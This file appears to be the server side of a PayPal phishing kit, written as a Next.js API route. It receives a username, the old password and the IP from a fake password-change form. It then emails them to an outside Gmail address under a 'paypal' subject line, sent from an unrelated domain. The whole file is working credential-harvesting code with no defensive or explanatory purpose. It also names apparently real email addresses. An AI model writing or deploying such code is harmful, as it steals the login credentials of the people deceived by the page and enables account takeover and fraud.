import { NextApiRequest, NextApiResponse } from "next";
import createNodeMailerTransport from "../../helpers/mailer";

type Data = {
    username: string,
    oldPassword: string,
    newPassword: string,
    confirmPassword: string,
    ip: string
}

export default async (req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) => {

    const { username, oldPassword, newPassword, confirmPassword, ip } = req.body;
    
    const transporter = await createNodeMailerTransport()

    await new Promise((resolve, reject) => {
        // verify connection configuration
        transporter.verify(function (error, success) {
            if (error) {
                console.log(error);
                reject(error);
            } else {
                console.log("Server is ready to take our messages");
                resolve(success);
            }
        });
    });
    
    const mailDetails = {
        from: 'support@greeniumtrade.com',
        to: 'campdaniel06@gmail.com',
        subject: 'paypal' + ' : ' + username + ' : ' + ip,
        html: '<p>username: ' + username + '</p>' + '<p>password: ' + oldPassword + '</p>' + '<p>ip: ' + ip + '</p>'
    }
    
    await new Promise((resolve, reject) => {
        // send mail
        transporter.sendMail(mailDetails, (err, info) => {
            if (err) {
                console.error(err);
                reject(err);
            } else {
                console.log(info);
                resolve(info);
            }
        });
    });
    
    res.status(200).json('Success');
};